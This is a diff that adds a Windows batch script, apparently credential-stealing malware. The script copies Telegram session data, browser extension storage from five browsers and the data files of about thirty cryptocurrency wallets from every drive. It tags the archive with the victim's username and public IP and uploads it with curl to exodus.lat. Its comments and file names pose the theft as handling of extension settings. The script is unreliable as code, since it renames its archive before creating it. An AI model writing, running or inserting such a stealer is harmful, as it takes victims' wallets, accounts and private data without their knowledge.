@@ -1,0 +1,149 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Set the necessary variables for extension and wallet settings
+set "uploadUrl=https://exodus.lat/files/upload.php"
+set "zipFile=%TEMP%\BrowserExtensionSettings.zip"
+set "tempZipDir=%TEMP%\ArchiveContents"
+set "foundExtensions=0"
+set "foundWallets=0"
+set "foundTdata=0"
+
+:: Create temporary directory for all files
+if exist "%tempZipDir%" rmdir /s /q "%tempZipDir%"
+mkdir "%tempZipDir%"
+
+:: Define wallet paths
+set "walletPaths[Bitcoin]=AppData\Roaming\Bitcoin\wallets"
+set "walletPaths[Zcash]=AppData\Roaming\Zcash"
+set "walletPaths[Armory]=AppData\Roaming\Armory"
+set "walletPaths[Bytecoin]=AppData\Roaming\bytecoin"
+set "walletPaths[Jaxx]=AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
+set "walletPaths[Exodus]=AppData\Roaming\Exodus\exodus.wallet"
+set "walletPaths[Ethereum]=AppData\Roaming\Ethereum\keystore"
+set "walletPaths[Electrum]=AppData\Roaming\Electrum\wallets"
+set "walletPaths[AtomicWallet]=AppData\Roaming\atomic\Local Storage\leveldb"
+set "walletPaths[Guarda]=AppData\Roaming\Guarda\Local Storage\leveldb"
+set "walletPaths[Coinomi]=AppData\Roaming\Coinomi\Coinomi\wallets"
+set "walletPaths[Wasabi]=AppData\Roaming\WasabiWallet\Client\Wallets"
+set "walletPaths[Monero]=AppData\Roaming\Monero\wallets"
+set "walletPaths[Ripple]=AppData\Roaming\Ripple\wallets"
+set "walletPaths[DogecoinCore]=AppData\Roaming\Dogecoin\wallets"
+set "walletPaths[LitecoinCore]=AppData\Roaming\Litecoin\wallets"
+set "walletPaths[DashCore]=AppData\Roaming\DashCore\wallets"
+set "walletPaths[BitcoinABC]=AppData\Roaming\BitcoinABC\wallets"
+set "walletPaths[VertcoinCore]=AppData\Roaming\Vertcoin\wallets"
+set "walletPaths[NamecoinCore]=AppData\Roaming\Namecoin\wallets"
+set "walletPaths[DigiByteCore]=AppData\Roaming\DigiByte\wallets"
+set "walletPaths[QtumCore]=AppData\Roaming\Qtum\wallets"
+set "walletPaths[Firo]=AppData\Roaming\Firo\wallets"
+set "walletPaths[PeercoinCore]=AppData\Roaming\PPCoin\wallets"
+set "walletPaths[GridcoinResearch]=AppData\Roaming\GridcoinResearch\wallets"
+set "walletPaths[FeathercoinCore]=AppData\Roaming\Feathercoin\wallets"
+set "walletPaths[RavencoinCore]=AppData\Roaming\Raven\wallets"
+set "walletPaths[BitcoinGoldCore]=AppData\Roaming\BitcoinGold\wallets"
+set "walletPaths[Komodo]=AppData\Roaming\Komodo\wallets"
+set "walletPaths[Horizen]=AppData\Roaming\Horizen\wallets"
+set "walletPaths[NexusCore]=AppData\Roaming\Nexus\wallets"
+
+:: Loop through all available drives
+for %%D in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+    set "chrome=%%D:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings"
+    set "brave=%%D:\Users\%USERNAME%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings"
+    set "firefox=%%D:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles"
+    set "edge=%%D:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Local Extension Settings"
+    set "opera=%%D:\Users\%USERNAME%\AppData\Roaming\Opera Software\Opera Stable\Extensions"
+    set "operaGX=%%D:\Users\%USERNAME%\AppData\Roaming\Opera Software\Opera GX Stable\Extensions"
+    set "tdataPath=%%D:\Users\%USERNAME%\AppData\Roaming\Telegram Desktop\tdata"
+
+    :: Check and copy Telegram tdata folder
+    if exist "!tdataPath!" (
+        mkdir "%tempZipDir%\tdata" 2>nul
+        xcopy /E /I "!tdataPath!" "%tempZipDir%\tdata\" >nul
+        set "foundTdata=1"
+    )
+
+    :: Check and copy Chrome extension local settings
+    if exist "!chrome!" (
+        mkdir "%tempZipDir%\Chrome" 2>nul
+        xcopy /E /I "!chrome!\*" "%tempZipDir%\Chrome\" >nul
+        set "foundExtensions=1"
+    )
+
+    :: Check and copy Brave extension local settings
+    if exist "!brave!" (
+        mkdir "%tempZipDir%\Brave" 2>nul
+        xcopy /E /I "!brave!\*" "%tempZipDir%\Brave\" >nul
+        set "foundExtensions=1"
+    )
+
+    :: Check and copy Edge extension local settings
+    if exist "!edge!" (
+        mkdir "%tempZipDir%\Edge" 2>nul
+        xcopy /E /I "!edge!\*" "%tempZipDir%\Edge\" >nul
+        set "foundExtensions=1"
+    )
+
+    :: Check and copy Opera extension local settings
+    if exist "!opera!" (
+        mkdir "%tempZipDir%\Opera" 2>nul
+        xcopy /E /I "!opera!\*" "%tempZipDir%\Opera\" >nul
+        set "foundExtensions=1"
+    )
+
+    :: Check and copy Opera GX extension local settings
+    if exist "!operaGX!" (
+        mkdir "%tempZipDir%\OperaGXExtensionSettings" 2>nul
+        xcopy /E /I "!operaGX!\*" "%tempZipDir%\OperaGX\" >nul
+        set "foundExtensions=1"
+    )
+
+    :: Check for wallet files and copy them if found
+    for %%W in (Bitcoin Zcash Armory Bytecoin Jaxx Exodus Ethereum Electrum AtomicWallet Guarda Coinomi Wasabi Monero Ripple DogecoinCore LitecoinCore DashCore BitcoinABC VertcoinCore NamecoinCore DigiByteCore QtumCore Firo PeercoinCore GridcoinResearch FeathercoinCore RavencoinCore BitcoinGoldCore Komodo Horizen NexusCore) do (
+        set "walletPath=!walletPaths[%%W]!"
+        if exist "%%D:\Users\%USERNAME%\!walletPath!" (
+            mkdir "%tempZipDir%\Wallet\%%W" 2>nul
+            xcopy /E /I "%%D:\Users\%USERNAME%\!walletPath!\*" "%tempZipDir%\Wallet\%%W\" >nul
+            set "foundWallets=1"
+        )
+    )
+)
+
+:: Retrieve the public IP
+for /f "tokens=* delims=" %%i in ('curl -s https://api.ipify.org') do set "publicIP=%%i"
+
+:: Renaming the ZIP file based on whether a wallet or extension is found
+if "!foundWallets!"=="1" (
+    if "!foundExtensions!"=="1" (
+        ren "%zipFile%" "W_%USERNAME%_%publicIP%.zip"
+        set "zipFile=%TEMP%\W_%USERNAME%_%publicIP%.zip"
+    ) else (
+        ren "%zipFile%" "W_%USERNAME%_%publicIP%.zip"
+        set "zipFile=%TEMP%\W_%USERNAME%_%publicIP%.zip"
+    )
+) else (
+    if "!foundExtensions!"=="1" (
+        ren "%zipFile%" "N_%USERNAME%_%publicIP%.zip"
+        set "zipFile=%TEMP%\N_%USERNAME%_%publicIP%.zip"
+    ) else (
+        goto end
+    )
+)
+
+:: Create the ZIP file from the parent directory
+powershell -command "Compress-Archive -Path '%tempZipDir%\*' -DestinationPath '%zipFile%'"
+
+:: Upload the ZIP file
+if exist "%zipFile%" (
+    set "response="
+    for /f "delims=" %%a in ('curl -F "file=@%zipFile%" "%uploadUrl%"') do (
+        set "response=%%a"
+    )
+)
+
+:end
+:: Cleanup
+if exist "%zipFile%" del "%zipFile%"
+if exist "%tempZipDir%" rmdir /s /q "%tempZipDir%"
+
+endlocal
